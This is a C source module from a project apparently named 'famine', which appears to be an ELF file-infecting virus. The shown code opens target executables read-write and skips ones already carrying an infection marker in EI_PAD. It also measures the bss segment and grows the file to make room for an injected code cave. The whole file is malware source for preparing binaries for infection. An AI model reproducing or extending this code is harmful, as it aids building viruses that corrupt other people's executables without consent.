#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include "famine.h"
#include "utils.h"
#include "map.h"
#include "syscall.h"

int	check_elf_magic(int fd) {
	Elf64_Ehdr ehdr;
	uint32_t magic;

	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
		ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
		ehdr.e_ident[EI_MAG1] != ELFMAG1 ||
		ehdr.e_ident[EI_MAG2] != ELFMAG2 ||
		ehdr.e_ident[EI_MAG3] != ELFMAG3) {
		return -1;
	}

	/* check if it's a 64-bit elf */
	if (ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
		return -1;
	}

	/* check EI_PAD to see if its infected */
	magic = *(uint32_t *)&ehdr.e_ident[EI_PAD];
	if (magic == MAGIC_NUMBER) {
		return -1;
	}

	return 0;
}


int get_bss_size(int fd, uint64_t* bss_len) {
	Elf64_Ehdr ehdr;
	Elf64_Phdr phdr;

	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr)) {
		return 1;
	}

	for (size_t i = ehdr.e_phnum; i--;) {

		if (pread(fd, &phdr, sizeof(Elf64_Phdr), ehdr.e_phoff + (i * ehdr.e_phentsize)) != sizeof(Elf64_Phdr)) {
			return 1;
		}

		if (phdr.p_type == PT_LOAD && phdr.p_flags == (PF_R | PF_W)) {
			*bss_len = phdr.p_memsz - phdr.p_filesz;
			break;
		}
	}

	return 0;
}


int map_file(const char *filename, t_data *data) {
	int		fd;
	uint8_t	*file;
	struct stat st;

	/* read + write */
	fd = open(filename, O_RDWR);
	if (fd == -1) {
		return -1;
	}

	if (fstat(fd, &st) == -1) {
		close(fd);
		return -1;
	}

	if (check_elf_magic(fd) == -1) {
		close(fd);
		return -1;
	}

	uint64_t bss_len = 0;
	if (get_bss_size(fd, &bss_len) != 0) {
		close(fd);
		return -1;
	}

	const size_t size = st.st_size + data->cave.p_size + bss_len;

	if (ftruncate(fd, size) == -1) {
		close(fd);
		return -1;
	}

	file = (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE, fd, 0);
	if (file == MAP_FAILED) {
		close(fd);
		return -1;
	}

	close(fd);

	data->elf.size = st.st_size;
	data->file = file;
	data->size = size;
	data->elf.mode = st.st_mode;

	return 0;
}
